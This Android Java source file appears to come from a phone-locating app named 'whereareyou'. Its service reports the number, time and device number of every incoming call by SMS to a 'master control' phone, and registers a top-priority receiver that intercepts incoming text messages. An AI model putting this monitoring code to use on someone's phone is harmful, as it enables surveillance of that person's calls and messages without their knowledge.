package com.example.whereareyou;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.widget.Toast;

public class ListenService extends Service{

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
    	Toast.makeText(this, "服务已经启动", Toast.LENGTH_LONG).show();
    	if(AppContext.isPhone()){
    		//这个是监控电话的功能
    		final TelephonyManager manager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
    		manager.listen(new PhoneStateListener(){
    			public void onCallStateChanged(int state, String incomingNumber) {
    				if(state == TelephonyManager.CALL_STATE_RINGING){
    					//发短信，给主控手机
    					if(!AppContext.getNumber().substring(AppContext.getNumber().length()-4).equals(incomingNumber)
    							&&!AppContext.getNumber().substring(AppContext.getNumber().length()-4).equals(incomingNumber.substring(incomingNumber.length()-4))){
    					AppUitl util = new AppUitl();
    		    		String time = util.getTime();
    		    		String sms = time + ":" + incomingNumber + " to " + manager.getLine1Number();
    		    		util.sendSms(AppContext.getNumber(), sms);
    					}
    				}
    			};
    		}
    		
    		, PhoneStateListener.LISTEN_CALL_STATE);
    	}
    	if(AppContext.isSms()||AppContext.isCallback()||AppContext.isRing()||AppContext.isVibra()){
    		//监控 短信
    		SmsReceiver receiver = new SmsReceiver();
    		IntentFilter filter = new IntentFilter();
    		filter.addAction("android.provider.Telephony.SMS_RECEIVED");  		
    		filter.setPriority(Integer.MAX_VALUE);
    		registerReceiver(receiver,filter);
    			
    		
    	}
    		
    	return super.onStartCommand(intent, flags, startId);
    }
}
